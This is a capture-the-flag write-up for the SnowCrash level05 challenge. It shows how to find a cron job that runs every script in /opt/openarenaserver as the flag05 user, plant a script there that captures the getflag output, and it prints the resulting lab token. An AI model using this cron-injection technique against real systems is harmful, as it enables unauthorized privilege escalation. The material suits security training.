# level05

First we tried to find all the files owned by flag05 : find / -user flag05 2> /dev/null
this command gave us : 
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
And with find / -iname level05 2> /dev/null
/var/mail/level05

Among other files but this last one is very interesting cause it's a cron file that contains:

```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

When we cat /usr/sbin/openarenaserver
We get : 

```
#!/bin/sh
for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

This script just execute all scripts in /opt/openarenaserver and erase them right after.
So we created in this directory a little bash script who does this: 

```
#!/bin/bash

getflag > /var/tmp/test.txt
```

```
/*********************************************************\

level05@SnowCrash:~$ cat /var/tmp/test.txt
Check flag.Here is your token : viuaaale9huek52boumoomioc

\*********************************************************/
```